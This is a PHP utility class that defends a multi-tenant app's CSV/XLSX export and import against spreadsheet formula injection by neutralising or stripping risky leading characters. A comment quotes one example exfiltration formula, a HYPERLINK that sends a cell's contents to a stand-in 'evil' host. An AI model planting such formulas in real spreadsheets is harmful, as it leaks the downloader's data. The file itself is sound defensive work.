<?php

declare(strict_types=1);

namespace App\Support;

/**
 * Neutralise cells that would be interpreted as formulas / DDE /
 * HYPERLINK gadgets when an Excel/Sheets user opens an exported CSV
 * or XLSX. Spreadsheet apps evaluate any cell whose first character
 * is one of =, +, -, @, tab, CR, NUL — a value crafted by a tenant
 * that runs through our export (product name, order notes, customer
 * email) can leak data, fetch remote payloads, or execute commands
 * on the downloader's machine.
 *
 * Industry-standard mitigation: prefix the risky leading char with a
 * single quote ('). Spreadsheet apps treat the cell as text, while
 * non-Office consumers see the literal value with one extra char.
 */
final class SpreadsheetSafety
{
    /**
     * Characters that, when they appear at position 0, trigger formula
     * evaluation in Excel / LibreOffice Calc / Google Sheets.
     */
    private const RISKY_LEADING_CHARS = ['=', '+', '-', '@', "\t", "\r", "\0"];

    /**
     * Neutralise a single cell value for export. Non-string values pass
     * through unchanged.
     */
    public static function neutralise(mixed $value): mixed
    {
        if (!is_string($value) || $value === '') {
            return $value;
        }

        if (in_array($value[0], self::RISKY_LEADING_CHARS, true)) {
            return "'" . $value;
        }

        return $value;
    }

    /**
     * Strip a leading risky character from imported input. Used on the
     * way IN so a tenant-uploaded CSV row that says
     *   name = =HYPERLINK("https://evil/?leak="&A2,"safe")
     * doesn't get persisted as-is and later re-exported to a downloader
     * whose viewer evaluates it.
     */
    public static function sanitiseImport(mixed $value): mixed
    {
        if (!is_string($value) || $value === '') {
            return $value;
        }

        while ($value !== '' && in_array($value[0], self::RISKY_LEADING_CHARS, true)) {
            $value = substr($value, 1);
        }

        return $value;
    }

    /**
     * Apply neutralise() to every value in an export row.
     */
    public static function neutraliseRow(array $row): array
    {
        return array_map([self::class, 'neutralise'], $row);
    }
}
